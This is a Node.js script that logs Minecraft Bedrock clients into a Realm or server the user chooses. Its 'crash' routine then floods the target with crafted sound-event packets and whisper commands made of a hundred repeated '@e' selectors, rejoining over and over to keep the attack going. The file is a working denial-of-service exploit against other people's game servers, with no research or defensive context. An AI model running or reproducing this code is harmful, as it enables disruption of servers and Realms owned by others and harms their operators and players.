const protocol = require("bedrock-protocol");
const { Authflow } = require('prismarine-auth');
const { RealmAPI } = require("prismarine-realms");

const onErrorCB = [];
const onError = (callback) => onErrorCB.push(callback);

const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const runCommand = (client, command) => {
    client.write('command_request', {
        command: command,
        origin: {
            type: 5,
            uuid: '',
            request_id: '',
        },
        internal: false,
        version: 66,
    });
};

const levelSoundEvent = (client, data) => {
    client.write('level_sound_event', data);
};

const crash = async (options, count = 3) => {
    const delay = !!options.delay;

    const run = async (count = 3) => {
        console.log(`${new Date().toLocaleTimeString()} > Starting ${count} clients...`);
        const client = new MultiClient(count);

        async function disconnected(data = "None") {
            if (Date.now() - this.lastCall < 2000) return;
            this.lastCall = Date.now();
            await client.destroy;
            console.log(`${new Date().toLocaleTimeString()} > ${client.clients[0].profile.name} disconnected!`, data);
            if (data === "server_id_conflict" || data === "server_full") await wait(3000);
            await wait(5000);
            await run(count);
        }

        onError((e) => {
            console.error(e);
        });

        client.once("kick", async (client, packet) => {
            console.log(`${new Date().toLocaleTimeString()} > ${client.profile.name} kicked!`, packet?.reason || "Unknown");
            return disconnected(packet);
        });

        client.once("disconnect", async (client, packet) => {
            if (typeof packet !== "string") packet = packet?.reason || "Unknown";
            if (packet === 'disconnectionScreen.serverIdConflict') return disconnected(packet);
            return disconnected(packet);
        });

        client.on("play_status", async (client, data) => {
            if (data.status !== "login_success") return;
            await wait(3);
            console.log(`${new Date().toLocaleTimeString()} > ${client.profile.name} joined! Sending packets...`);
            let i = 0;
            while (i < options.packets) {
                const pos = data.player_position ?? { x: 0, y: 0, z: 0 };
                levelSoundEvent(client, {
                    position: pos,
                    extra_data: -1,
                    sound_id: "Death",
                    entity_type: "minecraft:ender_dragon",
                    is_global: true,
                });
                levelSoundEvent(client, {
                    sound_id: "BundleRemoveOne",
                    entity_type: "",
                    position: pos,
                    is_global: true,
                    extra_data: -1124852450,
                    is_baby_mob: false,
                });
                runCommand(client, `w @a ${"@e".repeat(10).repeat(10)}`, ``);
                i++;
                if (delay) await wait(options.delay);
            }
            return disconnected(`Finished sending ${i} packets! Rejoining to repeat...`);
        });
    };

    run(count);
};

const options = {
    "profilesFolder": "./profiles",
    "username": "MinecraftOMG",
    "skipPing": true,
    "viewDistance": 32767
};

process.on("uncaughtException", (e) => {
    for (const errorCB of onErrorCB) errorCB(e);
    console.error(e);
});

process.on("unhandledRejection", (e) => {
    for (const errorCB of onErrorCB) errorCB(e);
    console.error(e);
});

const cin = () => new Promise((resolve) => {
    process.stdin.once("data", (data) => resolve(data.toString().trim()));
});

const flow = new Authflow(options.username, options.profilesFolder, {
    flow: "live",
    authTitle: "00000000441cc96b"
}, options.onMsaCode);

const api = RealmAPI.from(flow, 'bedrock');

api.getRealms().then(async (d) => {
    const realmData = d.map(r => {
        return {
            Name: r.name,
            ID: r.id,
            State: r.state
        };
    });

    console.table(realmData);

    console.log(`${new Date().toLocaleTimeString()} > Select A Target Type\n    1. Realm Code | 2. Server | 3. Realm ID`);

    cin().then(async input => {
        switch (input) {
            case "1":
                console.log(`Enter Realm Code`);
                const invite = await cin();
                (options.realms ??= {}).realmInvite = invite;
                break;
            case "2":
                console.log(`Enter Server IP`);
                const ip = await cin();
                options.host = ip;
                console.log(`Enter Server Port`);
                const port = await cin();
                options.port = parseInt(port);
                break;
            case "3":
                console.log(`Enter Realm ID`);
                const id = await cin();
                (options.realms ??= {}).realmId = parseInt(id);
                break;
            default:
                console.log(`Invalid Input ${input} | Exiting...`);
                await wait(5000);
                process.exit(1);
                return;
        }

        console.log(`Enter Delay (ms)`);
        const delay = parseInt(await cin());
        if (delay > 0) options.delay = delay;

        console.log(`Enter Amount of Clients | < 1 will default to 1`);
        const amount = parseInt(await cin());
        options.amount = Math.max(1, amount);

        console.log(`Enter Packets Per Join`);
        const packets = parseInt(await cin());
        options.packets = Math.max(0, packets);

        crash(options, options.amount);
    });
});

const __o__emit = protocol.Client.prototype.emit;

protocol.Client.prototype.emit = function (event, data) {
    if (this.parentClass) this.parentClass.emit(event, this, data);
    return __o__emit.call(this, event, data);
};

class MultiClient {
    constructor(amountOfClients) {
        this.clients = [];
        this.events = {};

        const createClients = async () => {
            let i = 0;
            while (i < amountOfClients) {
                i++;
                const c = new protocol.createClient(options);
                c.parentClass = this;
                this.clients.push(c);
                await wait();
            }
        };

        createClients();
    }

    emit(event, client, data) {
        for (const cB of this.events[event] ?? []) cB(client, data);
    }

    on(event, callback) {
        if (!this.events[event]) this.events[event] = [];
        this.events[event].push(callback);
    }

    once(event, callback) {
        if (!this.events[event]) this.events[event] = [];
        this.events[event].push((client, ...data) => {
            callback(client, ...data);
            this.events[event].splice(this.events[event].indexOf(callback), 1);
        });
    }

    get destroy() {
        return new Promise(async (resolve) => {
            for (const c of this.clients) {
                await c.removeAllListeners();
                await c.close();
            }
            resolve();
        });
    }
}
